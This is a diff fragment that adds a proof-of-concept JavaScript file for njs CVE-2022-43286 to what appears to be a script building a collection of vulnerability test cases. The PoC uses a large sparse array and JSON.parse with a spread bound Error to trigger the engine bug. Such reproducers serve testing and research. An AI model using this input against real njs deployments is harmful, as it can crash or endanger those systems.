@@ -292,3 +292,18 @@ async function f(a1,a2) {
 f.bind(1,2)();
 
 EOF
+
+# njs.cve-2022-43286
+cat > /testcase/poc.js << 'EOF'
+function main() {
+    const a2 = Array(50189);
+    const a3 = {};
+    const a4 = [a3, a2, a3];
+    const a7 = JSON["stringify"](a4);
+    const a9 = Error.bind();
+    const a11 = JSON["parse"](a7, ...a9);
+}
+
+main();
+
+EOF
